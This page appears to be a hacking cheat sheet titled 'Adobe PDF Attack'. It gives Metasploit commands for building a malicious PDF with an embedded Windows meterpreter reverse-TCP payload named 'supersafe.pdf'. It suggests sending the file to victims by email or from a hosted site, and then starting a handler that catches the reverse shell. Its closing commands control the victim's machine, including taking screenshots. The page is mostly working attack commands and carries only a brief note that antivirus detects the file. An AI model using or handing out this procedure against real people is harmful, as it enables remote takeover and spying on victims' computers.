---
title: Adobe PDF Attack
description: Attackers can compromise target machine by sending malicious PDF. 
tags:
    - Network
refs:
    - https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/fileformat/adobe_pdf_embedded_exe
    - https://www.youtube.com/watch?v=xYBsXkxDRh0
date: 2023-07-24
draft: false
---

## Exploitation using Metasploit

The PDF created by this process can be easily detected by modern Windows built-in antivirus. So this exploitation may be not useful for attackers.

### 1. Create a PDF

Attackers can create a malicious PDF using metasploit.

```bash
msfconsole

msf> use exploit/windows/fileformat/adobe_pdf_embedded_exe
# Set payload for windows if target machine is windows
msf> set payload windows/x64/meterpreter/reverse_tcp
# Set the attacker's ip address
msf> set lhost 10.0.0.1
# Change filename
msf> set filename supersafe.pdf
# Optionally, the custom PDF can be used
msf> set infilename /path/to/custom.pdf
msf> exploit
```

### 2. Send PDF to Target Machine

After creating a PDF, attackers need to send it to target user. There are various ways to do that. For example, 

- Host the PDF in attacker’s website.
- Send an email with this PDF attached.

### 3. Start Listener in Attacker’s Machine

To receive incoming connection from target machine, attackers start a listener in their machine.

```bash
msf> use exploit/multi/handler
# Match the payload when PDF was created
msf> set payload windows/x64/meterpreter/reverse_tcp
# Set the attacker's ip address
msf> set lhost 10.0.0.1
msf> exploit
```

### 4. Reverse Shell

When a victim open the PDF using Adobe Reader, this file starts a reverse shell to connect the attacker’s machine.  
After that, attackers can control the victim’s machine in their terminal. 

```bash
# In metasploit session

meterpreter> pwd
# Take a screenshot of the victim's screen
meterpreter> screenshot
```
